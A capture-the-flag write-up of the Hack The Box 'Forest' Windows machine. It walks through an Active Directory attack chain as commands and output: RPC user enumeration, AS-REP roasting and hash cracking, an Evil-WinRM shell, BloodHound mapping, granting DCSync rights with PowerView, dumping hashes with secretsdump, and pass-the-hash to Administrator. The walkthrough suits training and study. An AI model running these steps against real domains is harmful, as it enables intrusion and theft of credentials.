---
permalink: /posts/HTB/Forest
title:  "HTB Forest"
author: Luc Kolen
description: "Forest is an easy Windows machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB
  - Windows
  - RPC
  - AS-Rep roasting
  - BloodHound
---
# 10.10.10.161 - Forest

- [10.10.10.161 - Forest](#101010161---forest)
  - [Open ports](#open-ports)
    - [TCP](#tcp)
    - [UDP](#udp)
  - [Enumerate users via RPC](#enumerate-users-via-rpc)
  - [AS-REP Roasting](#as-rep-roasting)
  - [Evil-WinRM](#evil-winrm)
  - [Privilege escalation](#privilege-escalation)
  - [TL;DR](#tldr)

## Open ports

### TCP

```bash
luc@kali:~/Documents/Cyber-security/HTB/Forest$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.161
```

|Port|Service|
|---|---|
88/tcp|kerberos-sec
135/tcp|msrpc
139/tcp|netbios-ssn
389/tcp|ldap
445/tcp|microsoft-ds
464/tcp|kpasswd5?
593/tcp|ncacn_http
636/tcp|tcpwrapped
3268/tcp|ldap
3269/tcp|tcpwrapped
5985/tcp|Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp|mc-nmf
47001/tcp|Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp|msrpc
49665/tcp|msrpc
49666/tcp|msrpc
49667/tcp|msrpc
49671/tcp|msrpc
49676/tcp|ncacn_http
49677/tcp|msrpc
49684/tcp|msrpc
49706/tcp|msrpc

### UDP

```bash
luc@kali:~/Documents/Cyber-security/HTB/Forest$ nmap -vv --reason -Pn -sU -A --top-ports=20 --version-all 10.10.10.161
```

|Port|Service|
|---|---|
53/udp|domain
123/udp|ntp

## Enumerate users via RPC

```bash
luc@kali:~/Documents/Cyber-security/HTB/Forest$ rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
...
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

## AS-REP Roasting

Accounts that don't require pre authentication can be abused to get valid password hashes. GetNPUsers.py can be used to get these hashes.

```bash
luc@kali:~/Documents/Cyber-security/HTB/Forest$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb/svc-alfresco -no-pass -dc-ip 10.10.10.161
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:413: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if domain is '':
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:15115157097d426a68bb3ba3bef3556a$3c43a347e7987d71c676a307e0db178deb302602782d260da7f979cd9693e7001d58ecd9233612ee969ce7e7c6de1f9832a3c5e1fbf6ce93389d6e177597d39bd93d349785a3a0b5090a557c5f8ec62c2be318e9217823678f8eb0b0d455f1e44e03760be3d0887eedacbb087327abe44d760f9101e72f2e47ab1bc480e7e355b15457f6e1b3703831c6980d1603a32587f2dce5ef87c1f6e75c466a4780c9e41acd39b86bfb1d5d3928b1991844293f2eb68e89a2e62aa9e28fb155f8b21407dbd7b32ff195ae4cb27d4c433e90544d775e2a5a476e8ca85b72b487c70e04
```

Hashcat can be used to crack this hash

```bash
luc@kali:~/Documents/Cyber-security/HTB/Forest$ echo '$krb5asrep$23$svc-alfresco@HTB:15115157097d426a68bb3ba3bef3556a$3c43a347e7987d71c676a307e0db178deb302602782d260da7f979cd9693e7001d58ecd9233612ee969ce7e7c6de1f9832a3c5e1fbf6ce93389d6e177597d39bd93d349785a3a0b5090a557c5f8ec62c2be318e9217823678f8eb0b0d455f1e44e03760be3d0887eedacbb087327abe44d760f9101e72f2e47ab1bc480e7e355b15457f6e1b3703831c6980d1603a32587f2dce5ef87c1f6e75c466a4780c9e41acd39b86bfb1d5d3928b1991844293f2eb68e89a2e62aa9e28fb155f8b21407dbd7b32ff195ae4cb27d4c433e90544d775e2a5a476e8ca85b72b487c70e04' > hashes
luc@kali:~/Documents/Cyber-security/HTB/Forest$ hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt
...
$krb5asrep$23$svc-alfresco@HTB:15115157097d426a68bb3ba3bef3556a$3c43a347e7987d71c676a307e0db178deb302602782d260da7f979cd9693e7001d58ecd9233612ee969ce7e7c6de1f9832a3c5e1fbf6ce93389d6e177597d39bd93d349785a3a0b5090a557c5f8ec62c2be318e9217823678f8eb0b0d455f1e44e03760be3d0887eedacbb087327abe44d760f9101e72f2e47ab1bc480e7e355b15457f6e1b3703831c6980d1603a32587f2dce5ef87c1f6e75c466a4780c9e41acd39b86bfb1d5d3928b1991844293f2eb68e89a2e62aa9e28fb155f8b21407dbd7b32ff195ae4cb27d4c433e90544d775e2a5a476e8ca85b72b487c70e04:s3rvice
...
```

The password for the user `svc-alfresco` is `s3rvice`.

## Evil-WinRM

These credentials can be used to get a shell via `Evil-WinRM` and to read the user.txt file

```bash
luc@kali:~/Documents/Cyber-security/HTB/Forest$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt
e5e4e47a************************
```

## Privilege escalation

```bash
luc@kali:~/Documents/Cyber-security/HTB/Forest$ cp /opt/BloodHound/Ingestors/SharpHound.ps1 .
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload SharpHound.ps1
Info: Uploading SharpHound.ps1 to C:\Users\svc-alfresco\Desktop\SharpHound.ps1

Data: 1297080 bytes of 1297080 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Import-module ./SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/10/2020   4:18 AM          15449 20200610041827_BloodHound.zip
-a----        6/10/2020   4:18 AM          23611 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        6/10/2020   4:16 AM         972811 SharpHound.ps1
-ar---        9/23/2019   2:16 PM             32 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> download 20200610041827_BloodHound.zip
Info: Downloading C:\Users\svc-alfresco\Desktop\20200610041827_BloodHound.zip to 20200610041827_BloodHound.zip

Info: Download successful!
```

Before starting Bloodhound we have to start Neo4j

```bash
luc@kali:~/Documents/Cyber-security/HTB/Forest$ sudo neo4j console
```

![Neo4j login](/assets/images/HTB-Forest/1.a%20neo4j%20login.png)

Now we can start Bloodhound and import the data

```bash
luc@kali:/opt/BloodHound-Binaries$ sudo ./BloodHound --no-sandbox
```

![Bloodhound upload data](/assets/images/HTB-Forest/1.b%20Bloodhound%20upload%20data.png)

![Bloodhound shortest path to domain admin](/assets/images/HTB-Forest/1.c%20Bloodhound%20shortest%20path%20to%20domain%20admin.png)

We've access to svc-alfresco who has GenericAll permissions on the Exchange Windows Permissions group. This allows us to add svc-alfresco to this group. The Exchange Windows Permissions group has WriteDacl permissions on the domain. We can use this to grant DCSync privileges.

We need to use the dev branch of `PowerSploit` to use the `Add-DomainObjectAcl` function in `PowerView.ps1`.

```bash
luc@kali:/opt$ sudo git clone https://github.com/PowerShellMafia/PowerSploit/ -b dev
luc@kali:~/Documents/Cyber-security/HTB/Forest$ cp /opt/PowerSploit/Recon/PowerView.ps1 .
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload PowerView.ps1
Info: Uploading PowerView.ps1 to C:\Users\svc-alfresco\Desktop\PowerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> import-module ./powerview.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" svc-alfresco /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $password = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $credentials = New-Object System.Management.Automation.PSCredential ("htb\svc-alfresco", $password)
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-DomainObjectAcl -Credential $credentials -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

Now that we've DCSync rights we can use `secretsdump.py` to get all hashes and we can use those to get a shell via `Evil-WinRM`.

```bash
luc@kali:~/Documents/Cyber-security/HTB/Forest$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py svc-alfresco:s3rvice@10.10.10.161
...
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
...
luc@kali:~/Documents/Cyber-security/HTB/Forest$ evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
f048153f************************
```

## TL;DR

- Svc-alfresco doesn't have Kerberos Pre-Authentication enabled allowing us to find the password hash
- Crack the password hash
- BloodHound to find a path from Svc-alfresco to DCSync privileges
- Use those privileges to dump all hashes
- Use administrator hash to log in
